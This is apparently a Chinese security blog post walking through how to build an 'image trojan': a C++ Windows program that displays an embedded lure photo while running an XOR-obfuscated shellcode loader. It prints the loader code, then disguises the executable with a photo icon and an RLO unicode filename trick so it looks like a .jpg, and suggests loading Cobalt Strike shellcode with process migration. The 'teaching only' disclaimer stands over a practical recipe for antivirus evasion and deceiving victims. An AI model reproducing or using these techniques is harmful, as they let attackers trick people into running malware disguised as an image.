> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0Lg866l7tpR7K8I6Ay5kxA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOXlh3uSduBicGQAlDeUicT8ibwXfneO2JeCMEM2OwdIYp0Bl1ibLIzpqh1A/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

图片马  

在研究免杀过程中，多多少少看到一些**图片马**文章，可能免杀效果一般，但是也挺有趣的。

他们图片马的大体思路就是，准备一个凉快的照片和一个可执行的 exe 马子，使用压缩包的方式将两个文件压缩，然后设定点击自动解压，释放图片和木马，并同时运行图片和木马。视觉上就感觉打开了一个图片，但是这种方式免杀前提就是 exe 马子要免杀，而且解压会释放文件。

图片马 - 我的思路

既然图片马的效果是显示一个照片，同时运行恶意文件。使用代码写在一起不就行了。  

（c/c++ 刚入门啊，代码写的可能比较烂，但达到目的就行啦）

怎么打开图片

首先准备一个 lsp 可能点开的照片

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOicia7C9Dibp3FoNHYzMfLKdGV3Qssvz4IVwoGBSe9lruIv3micChfaJYicA/640?wx_fmt=png)

想使用 c++ 实现打开图片功能很多种，可以使用运行命令打开相册一样打开图片。

但是，这个方式需要我们连照片一起上传，既然我们要生成图片马，只能看到这一个文件，不能再上传一个图片上去吧。所以只能把我们准备好的照片放进项目的资源文件，然后调用该资源文件进行图片输出。

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOjAwbiaBJ74z8Q4Sxkafqjyw9F3EKECrLTggo3385icUcC7BqTXaexkCA/640?wx_fmt=png)

我上网搜了很多种调用资源文件进行打印图片的方法

有一个是自己写一个 win 窗口，将图片当做窗口背景。但是代码挺多的，win 开发我还没学会。

另一种就行利用 EasyX，它是一个用于 C++ 的图形库，可以很方便的输出一个图片。

> 使用这个库需要下载安装一下
> 
> https://easyx.cn/
> 
> 然后使用手册在这
> 
> https://docs.easyx.cn/en-us/intro

打开图片

我在网上找了个使用该库打印图片的源码

```
#include<graphics.h> //需要调用该头文件，安装EasyX才能用
#include<conio.h>
#include<iostream>
using namespace std;

int main() {
  IMAGE img; //创建一个img对象
  loadimage(&img, L"IMAGE", MAKEINTRESOURCE(IDR_IMAGE1)); //加载资源文件里的图片
  int w, h;
  w = img.getwidth();
  h = img.getheight();
  initgraph(w, h); //初始化一个窗口
  putimage(0, 0, &img); //输出图片
  getchar(); //获取一个字符，这里截断一下流程，防止输出完图片就关闭了。
  closegraph();
  return 1;
}
```

然后将照片放入资源文件，注意找的图片最好分辨率低一点，不然文件太大。

还有一个坑就是一定使用 jpg 格式的文件，导入时候作为一个自定义格式的 “IMAGE” 资源

![](https://mmbiz.qpic.cn/mmbiz_gif/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOukhTqGiciamqeMGDRmwdI3ribGzgqTuoqicFNZoMtZR4XRlXMoO9gYz89A/640?wx_fmt=gif)

导入之后就生产了对应的资源文件的头文件 resource.h

源代码包含它，并使用 MAKEINTRESOURCE() 函数转换资源文件的 id。

```
loadimage(&img, L"IMAGE", MAKEINTRESOURCE(IDR_IMAGE1));
```

然后运行测试一下图片输出效果。

![](https://mmbiz.qpic.cn/mmbiz_gif/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOdSvv1Z3uIialiaghyUkONypJiax6NqPT74dLDKJ7SA54xOWUTJXqPMkTw/640?wx_fmt=gif)

有那感觉了。

写木马

写木马就简单了，直接把之前研究的内存加载器代码复制过去就行了。

这个加载器只是简单弹个计算器，具体的 shellcode 加密、写内存方式都在上文有《[免杀 - C 加载器免杀尝试](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247486589&idx=1&sn=a9eab78fc859dd027bbb355d572f7bde&chksm=9774309ca003b98a5a6d23f9ed14ab0c13af29e5d718acb70bad361a420ec9f26dffb2a50471&scene=21#wechat_redirect)》。

```
int main()
{
  unsigned char sh3llc0de[] = "\x1c\x65\x24...";
  unsigned char key[] = "\x09\xab";
  unsigned char aa[] = "\x32\xff";

  DWORD dw_size = sizeof sh3llc0de;
  int i;
  for (i = 0; i < dw_size; i++) {

    sh3llc0de[i] ^= key[1];
    sh3llc0de[i] = aa[1] - sh3llc0de[i];
  }
  LPVOID men = CoTaskMemAlloc(sizeof sh3llc0de);
  DWORD lpflOldProtect = 0;
  UINT name = RegisterClipboardFormatW((LPCWSTR)sh3llc0de);
  VirtualProtect(men, sizeof sh3llc0de, 0x40, &lpflOldProtect);
  GetClipboardFormatNameW(name, (LPWSTR)men, sizeof sh3llc0de);
  HANDLE handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)men, 0, 0, 0);
  WaitForSingleObject(handle, -1);
  
  image();
  return 0;
}
```

image() 这里是将图片输出功能写成了一个函数，直接调用。

```
void image() {
  IMAGE img;
  loadimage(&img, L"IMAGE", MAKEINTRESOURCE(IDR_IMAGE1));
  int w, h;
  w = img.getwidth();
  h = img.getheight();
  initgraph(w, h);
  putimage(0, 0, &img);
  getchar();
  closegraph();
}
```

然后我生成的 x64 的文件，免杀效果好点。

然后生成运行一下，测试效果咋样。

![](https://mmbiz.qpic.cn/mmbiz_gif/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOPq7ppRa0S6UqHDRl9GhR6QYk2n5gkwJ3BbsKkf4cFJEib0RwhNpfooA/640?wx_fmt=gif)

进一步伪装

网上找一个照片的 ico 文件

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOlZZI76H88vAAhBzb3Pt438hLEsYY5RYVpGVnU20XytwbvdH6dpwd5Q/640?wx_fmt=png)

然后添加到资源文件中，生成的 exe 就更像一个图片了。

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOmke4SUtdGOgd12qH6UYn6L9bicD14XJ2IoMW5JH5MSxeS8mbE7ULLxg/640?wx_fmt=png)

然后继续操作老掉牙的 unicode 反转字符。

将文件命名为 fil‫gpj.moc.exe，然后在 fil 后面插入 unicode 反转字符 RLO

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVO2oD5bX8AUc2e1qEkVKpp9PWqXPpCaCtwQ9dKAuuo8I0YOf6QeWC5Kg/640?wx_fmt=png)

具体反转字符怎么用去百度，RLO 是将强字符从右向左读取

得到的文件，更像一个 jpg 图片了，还是带 xxx 网站链接的 xxxx。

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVO4lWTmdLspyG0YwtQAcUT7hicpUIK7a6nhUJkKumEcgl06mkISibSeSLQ/640?wx_fmt=png)

但是我们反转字符的字符不能太长。看看下面效果，太长就暴露了

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOIlUQmSYtPEk5PJdnGmIVUvh9Y0cibWeiaP9ia01GvJwFIgPAosMCA70fg/640?wx_fmt=png)

具体怎么反转看你们思路了

最后测试

最后运行一下，看看效果。  

![](https://mmbiz.qpic.cn/mmbiz_gif/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVOvicj2dicxYqTKzQgrAuziaMtMaIDoQibyIljgM26EL9XZnicqD5cPRnn44w/640?wx_fmt=gif)

虽然不是很完美啊，但效果达到了，打开照片，同时运行了我们的 shellcode 加载器。可以看到啊有一个黑框闪过，有空再改改吧黑框去除。

如果换那些 CS 的 shellcode，加载器最好改成个进程迁移操作的，因为我们关闭照片，程序也就结束了，这里挖个坑，有空来补上。

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSM7VoY5O4uictnvMP1ib0CwVObs2WYrSCDJicIgWppoxC78ulmgSriay0JPmGiaMKF3NnYWZEn8rETmg1A/640?wx_fmt=png)

免杀效果看看就好，反正是玩。源码回复：lsp